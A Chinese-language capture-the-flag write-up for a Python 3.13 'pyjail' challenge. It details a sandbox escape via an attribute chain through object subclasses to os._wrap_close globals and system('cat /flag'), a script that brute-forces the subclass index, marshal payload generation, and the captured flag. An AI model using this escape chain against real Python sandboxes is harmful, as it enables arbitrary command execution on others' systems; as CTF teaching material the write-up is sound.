# pyjail?!（Misc 1000pt，容器 103.163.47.230:33638）

- 附件：`pyjail-ez.zip` → `jail.py`（Python **3.13**）
- 脚本：`exp_pyjail.py`
- flag：`HTUCTF{f3c38ce3-c29f-4e95-b3db-555fd8047bd0}`

## 题目机制

交互式提交 **base64(marshal(code object))**，服务端校验后 `eval(co, {"__builtins__": None})`：

```python
def check(co):
    if type(co) is not types.CodeType: reject()
    if len(co.co_code) > MAX_CODE: reject()
    if co.co_nlocals != 0 or co.co_varnames: reject("locals are forbidden")
    if any(isinstance(c, types.CodeType) for c in co.co_consts): reject("nested code objects")
    for ins in dis.get_instructions(co):
        if ins.opname in BANNED_OPS: reject(ins.opname)
```

`BANNED_OPS` 里有 `LOAD_NAME / STORE_NAME / LOAD_GLOBAL / LOAD_FAST / MAKE_FUNCTION /
IMPORT_NAME / IMPORT_FROM / LOAD_BUILD_CLASS / LOAD_LOCALS / LOAD_ASSERTION_ERROR` 等，
`co_nlocals` 必须是 0、不能有嵌套 code object、`__builtins__` 被置为 `None`。

## 关键点：`LOAD_ATTR` 没有被禁

名字、局部变量、import 全禁了，但 **`LOAD_ATTR` 是允许的**。而属性名走的是 `co_names`，
这条路子照样能拿到 `co_names` 里的名字（`check` 没有限制 `co_names`）。

于是从任意常量出发就能一路属性链下去：

```python
().__class__.__base__.__subclasses__()[N].__init__.__globals__['system']('cat /flag')
```

- `().__class__` → tuple，`.__base__` → object，`.__subclasses__()` → 所有直接子类
- 找一个**Python 层**定义的类（`__init__` 是 Python 函数，才有 `__globals__`），
  其 globals 里正好有 `system` —— 经典目标 `os._wrap_close`
- `['system']` 是 `BINARY_SUBSCR`，`('cat /flag')` 是 `LOAD_CONST` + `CALL_FUNCTION`，
  全部不在黑名单里

## 爆破下标

本地写个循环，对 `N = 0..260` 每个都发一次：

```
().__class__.__base__.__subclasses__()[N].__init__.__globals__['system']('cat /flag;ls /')
```

返回值的三类特征很清晰：

| 输出 | 含义 |
| --- | --- |
| `runtime: AttributeError` | 这个类没有 `__init__.__globals__`（C 实现的类） |
| `runtime: KeyError` | 有 globals，但里面没有 `system` |
| 直接吐 flag | 命中 `os._wrap_close` |

本容器结果：`N = 159`（116~121、137~147 是 KeyError 那批，都是 Python 层类）。

## 完整 payload 生成

```python
import base64, marshal
expr = "().__class__.__base__.__subclasses__()[159].__init__.__globals__['system']('cat /flag')"
open('p.txt','wb').write(base64.b64encode(marshal.dumps(compile(expr, "<p>", "eval"))))
```

```
HTUCTF{f3c38ce3-c29f-4e95-b3db-555fd8047bd0}
```

## 踩坑

1. **marshal 的版本必须和服务端 Python 完全一致（3.13）**，否则直接 `bad payload`。
   本机正好是 3.13.12，一次成功。
2. `eval(co, {"__builtins__": None})` 下没法 `print`，所以不能靠打印来探测——
   唯一可用的反馈是**异常类型名**（`runtime: XxxError`），正好够用来爆破下标。
3. 用 `os._wrap_close` 比走 `__builtins__` 更省事：直接 `['system']`，不用管
   `__builtins__` 在 globals 里是 module 还是 dict。

---

## 附：怎么运行（实测）

```powershell
cd "D:\桌面\htu\misc\pyjail!"
python .\exp_pyjail.py
```

- 硬性要求 **Python 3.13**：`marshal` 版本必须与服务端一致，否则服务端只回 `bad payload: ValueError`。
  本机默认 `python` = 3.13.14 直接可用；`py -3.13` 是 3.13.9 也能跑；3.12 / 3.9 一律不行。
- 脚本顶部两个常量按需改：`ENTRY = ("103.163.47.230", 35154)`、`IDX = 159`
  （`os._wrap_close` 在当前容器 `__subclasses__()` 里的下标）。
- 实例重启后若报 `IndexError`，说明下标漂了：把 `IDX` 在 130~200 扫一遍，取能把 `system` 打出来的那个。
- 实测输出：`HTUCTF{f3c38ce3-c29f-4e95-b3db-555fd8047bd0}`，随后是 `ls /` 的目录列表。
